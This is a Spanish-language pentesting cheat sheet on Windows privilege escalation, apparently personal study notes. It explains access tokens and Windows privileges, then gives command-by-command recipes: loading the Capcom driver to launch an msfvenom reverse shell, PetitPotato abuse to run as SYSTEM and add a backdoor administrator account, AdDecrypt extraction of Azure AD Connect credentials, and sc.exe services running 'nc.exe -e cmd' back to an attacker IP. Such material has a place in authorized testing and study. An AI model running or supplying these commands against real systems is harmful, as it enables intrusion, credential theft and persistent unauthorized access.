# Escalación de privilegios en Windows 

Tags: #AD #Windows #SeImpersonatePrivilege #SeAssignPrimaryTokenPrivilege

* [Escalacion-Privilegios-Payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [Abusando de Tokens Windows - Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

## Tokens de acceso 

Los tokens de acceso en Windows son estructuras de datos que almacenan la información de seguridad y de usuario asociada a un proceso o hilo. Estas estructuras son esenciales dentro del modelo de seguridad de Windows, ya que definen los derechos y privilegios asignados a un proceso o hilo específico en el sistema.

A continuación, se presentan detalles clave sobre los tokens de acceso en Windows:

```bash 
1. Tipos de Tokens: Hay dos tipos principales de tokens en Windows:
    
    - Token de usuario: Representa a un usuario que se ha autenticado con éxito. Está asociado con todos los procesos iniciados por ese usuario.
    - Token primario: Es el token asociado con un proceso cuando se inicia.
    - Token de impersonación: Permite a un hilo actuar con diferentes niveles de privilegio de su proceso contenedor. Es útil, por ejemplo, cuando un servicio necesita realizar tareas con privilegios diferentes.
        
    
2. Información en Tokens: Un token de acceso contiene información como:
    
    - Identificador de usuario (User SID): Identifica al usuario asociado con el token.
    - Grupos SID: Identifica a los grupos de los que el usuario es miembro.
    - Privilegios: Define acciones específicas que el usuario puede realizar, como apagar el sistema o cambiar la hora del sistema.
    - Tipo de token: Indica si el token es primario o de impersonación.
    - Nivel de impersonación: Si es un token de impersonation, este campo especifica el nivel (Anónimo, Identificación, Impersonación, Delegación).
    - Discretionary Access Control List (DACL): Especifica qué objetos puede acceder el portador del token y con qué permisos.
        
    
3. Impersonation: Esta es una característica clave en Windows que permite a un hilo tomar el token de otro usuario y "impersonarlo", es decir, actuar con los privilegios de ese usuario. Es útil en situaciones como servidores que necesitan acceder a recursos en nombre de un cliente.
    
4. Token Stealing: En el contexto de la seguridad, los tokens de acceso pueden ser objeto de abuso por parte de atacantes. Si un atacante logra comprometer un proceso o hilo con privilegios elevados, puede "robar" el token asociado y usarlo para impersonar a ese usuario o proceso de alto privilegio, facilitando la escalación de privilegios o el movimiento lateral.
    
5. Creación de Tokens: Los tokens de acceso se crean durante el proceso de autenticación. Cuando un usuario inicia sesión en una máquina Windows, el sistema genera un token de acceso que representa al usuario y a todos sus grupos y privilegios asociados.
    
6. Modificación de Tokens: A través de APIs específicas, es posible modificar tokens, aunque generalmente esto requiere privilegios elevados. Esta capacidad puede ser abusada por malware o atacantes para alterar los derechos y permisos de un token.
```

Los tokens de acceso desempeñan un papel fundamental en la infraestructura de seguridad de Windows. Brindan una notable flexibilidad para la gestión de identidades y accesos, aunque también pueden convertirse en un posible punto de ataque si no se manejan y protegen de forma adecuada. Por ello, es esencial que los administradores y expertos en seguridad entiendan su funcionamiento y las medidas necesarias para prevenir su uso indebido.

## Privilegios en Windows

* [Niveles de integridad - Hacktricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/integrity-levels)

En los sistemas operativos Windows, los privilegios son permisos otorgados a las cuentas de usuario y servicios, los cuales determinan las acciones que pueden ejecutarse en el sistema. Estos privilegios regulan aspectos clave de la seguridad y la administración del sistema, permitiendo desde la modificación del reloj del sistema hasta la gestión de registros y configuraciones de seguridad. A continuación, te presento una lista de los privilegios disponibles en Windows, aunque es importante tener en cuenta que esta lista puede variar ligeramente según la versión del sistema operativo.

```bash 
1. SeAssignPrimaryTokenPrivilege: Asignar un token primario a un proceso.
2. SeAuditPrivilege: Generar eventos de auditoría de seguridad.
3. SeBackupPrivilege: Omitir comprobaciones de permisos para realizar operaciones de respaldo.
4. SeChangeNotifyPrivilege: Omitir la notificación de cambio de directorio.
5. SeCreateGlobalPrivilege: Crear objetos globales.
6. SeCreatePagefilePrivilege: Crear un archivo de paginación.
7. SeCreatePermanentPrivilege: Crear objetos permanentes.
8. SeCreateSymbolicLinkPrivilege: Crear enlaces simbólicos.
9. SeCreateTokenPrivilege: Crear un token de objeto.
10. SeDebugPrivilege: Depurar programas.
11. SeEnableDelegationPrivilege: Habilitar la delegación de seguridad.
12. SeImpersonatePrivilege: Impersonar a un cliente después de la autenticación.
13. SeIncreaseBasePriorityPrivilege: Aumentar la prioridad de proceso.
14. SeIncreaseQuotaPrivilege: Aumentar cuotas de proceso.
15. SeIncreaseWorkingSetPrivilege: Aumentar el conjunto de trabajo de un proceso.
16. SeLoadDriverPrivilege: Cargar y descargar controladores de dispositivos.
17. SeLockMemoryPrivilege: Bloquear páginas en memoria.
18. SeMachineAccountPrivilege: Agregar equipos al dominio.
19. SeManageVolumePrivilege: Realizar mantenimiento de volumen.
20. SeProfileSingleProcessPrivilege: Realizar monitoreo de rendimiento.
21. SeRelabelPrivilege: Modificar etiquetas de integridad de objetos.
22. SeRemoteShutdownPrivilege: Forzar el apagado desde un sistema remoto.
23. SeRestorePrivilege: Omitir comprobaciones de permisos para realizar operaciones de restauración.
24. SeSecurityPrivilege: Administrar auditoría y registro de seguridad.
25. SeShutdownPrivilege: Apagar el sistema.
26. SeSyncAgentPrivilege: Sincronizar datos de directorio.
27. SeSystemEnvironmentPrivilege: Modificar la configuración del entorno del firmware.
28. SeSystemProfilePrivilege: Realizar monitoreo de rendimiento del sistema.
29. SeSystemtimePrivilege: Cambiar la hora del sistema.
30. SeTakeOwnershipPrivilege: Tomar propiedad de archivos u otros objetos.
31. SeTcbPrivilege: Actuar como parte del sistema operativo.
32. SeTimeZonePrivilege: Cambiar la zona horaria.
33. SeTrustedCredManAccessPrivilege: Acceder a credenciales guardadas de manera segura.
34. SeUndockPrivilege: Desacoplar el sistema de la base.
35. SeUnsolicitedInputPrivilege: Leer la entrada no solicitada del terminal interactivo.
```  

Cada uno de estos privilegios otorga la capacidad de realizar acciones concretas en el sistema que pueden influir en su configuración, seguridad y funcionamiento general. Los administradores del sistema deben gestionar y asignar estos privilegios con cuidado para garantizar la seguridad y el correcto desempeño de los sistemas Windows.

## Privilegios Windows para escalar 

```bash 
❯ whoami /priv        # Muestra los privilegios del usuario actual 
```

```powershell 
1. 'SeLoadDriverPrivilege' = Permite 'cargar drivers firmados' que se ejecutan con permisos del 'kernel (ring 0)'. Si puedes cargar un 'driver malicioso' (uno que eleva privilegios), te puedes convertir en 'NT AUTHORITY\SYSTEM' o incluso ejecutar código arbitrario en el núcleo


Pasos:
❯ https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp    # Copiar el codigo en Visual studio creando un nuevo proyecto 'Aplicación de consola'. Guardar con 'Release' y complilarlo con 'Compilar solución' y transferir 'EoPLoadDriver.exe' a la máquina Windows comprometida
❯ https://github.com/FuzzySecurity/Capcom-Rootkit/tree/master/Driver    # Descargar el archivo 'Capcom.sys' y transferirlo a la máquina Windows comprometida
❯ .\EoPLoadDriver.exe System\CurrentControlSet\MyService C:\Windows\Temp\Capcom.sys  # Cargar el driver y debe de mostrar 'NTSTATUS: 00000000, WinError: 0'
❯ https://github.com/tandasat/ExploitCapcom   # Descargar el proyecto completo en zip para abrirlo desde Visual Studio. Modificar la linea de 'LaunchShell' y colocar "C:\\ProgramData\\reverse.exe". Guardar con 'Release' y complilarlo con 'Compilar solución' y transferir 'ExploitCapcom.exe' a la máquina Windows comprometida
❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f exe -o reverse.exe  # Crear el archivo al cual llamará 'ExploitCapcom.exe' al momento de ejecutarse y transferirlo a la máquina Windows comprometida
❯ .\ExploitCapcom.exe        # Ejecutar el archivo en Windows y obtener la revershell en Kali 

Notas:
	1. Si al momento de compilar da un error, eliminar '#include "stdafx.h"' y volverlo a compilar
	2. La ruta donde compila los archivos la muestra en la consola 
	3. Para obtener la revershell se debe estar en escucha con 'Netcat'
```

```powershell
2. 'SetImpersonatePrivilege' = Abusando de 'SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege'. Si un usuario tiene los privilegios antes mencionados se puede aprovechar para obtener acceso a nivel de SYSTEM


Pasos:
❯ https://github.com/wh0amitz/PetitPotato/releases/tag/v1.0.0   # Descargar el archivo y transferirlo a la máquina Windows comprometida 
❯ PetitPotato.exe 3 cmd         # Crear una cmd con rl usuario 'NT Authority\System' 
	# EfsID = '3' es el numero de API a usar
❯ PetitPotato.exe 3 "whoami"    # Ejecutar un comando  
❯ PetitPotato.exe 3 "net user omar P4ssw0rd /add"               # Crear un user siendo 'NT Authority\System'
❯ PetitPotato.exe 3 "net localgroup Administrators omar /add"   # Agregar el usuario al grupo 'Administrators'
❯ PetitPotato.exe 3 "net user Omar"                             # Mirar el grupo de un usuario en especifico

Notas:
	1. Despues de crear un usuario para tener persistencia, podemos ingresar a con RDP si esta abierto el puerto '3389'
	2. También se pude utilizar 'RottenPotato o JuicyPotato'
```

## Grupos Windows para escalar 

```bash 
❯ net user <user>     # Mirar los grupos del usuario 
```

```powershell
1. 'Azure Admins' = Si puedes acceder a Azure AD Connect desde un usuario del grupo 'Azure Admins', puedes extraer credenciales privilegiadas y 'escalar a Domain Admin'.


Pasos: 
❯ https://github.com/VbScrub/AdSyncDecrypt/releases/tag/v1.0   # Descargar el archivo AdDecrypt.zip y extraer su contenido para obtener 'AdDecrypt.exe, mcrypt.dll' y transferir los archivos a la máquina Windows comprometida
❯ 'C:\Program Files\Microsoft Azure AD Sync\Bin'  # Ir a la siguiente ruta y ejecutar el 'AdDecrypt.exe'
❯ AdDecrypt.exe -FullSQL      # Ejecutar la herramienta para extraer credenciales del usuario Admin 

Notas: 
	1. El AdDecrypt.exe y mcrypt.dll se deben de encontrar en la misma carpeta
```

```powershell 
2. 'Server Operators' = Si pertenece a este grupo en un sistema Windows, se tiene ciertos privilegios elevados 'localmente' sobre los servidores y se puede 'iniciar, detener, configurar, crear, reiniciar realizar backups' sobre los servicios existentes.


Pasos:
❯ nc.exe     # Descargar y tranferir el archivo a la máquina Windows comprometida para hacer la Revershell
❯ services   # Mirar todos los servicios que se estan ejecutando 
❯ sc.exe create <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Crear un servicio 
❯ sc.exe config <service> binPath="C:\Users\omar\Desktop\nc.exe -e cmd IP 443"   # Modificar un servicio 
❯ sc.exe stop <service>         # Detener un servicio 
❯ sc.exe start <service>        # Iniciar un servicio 
```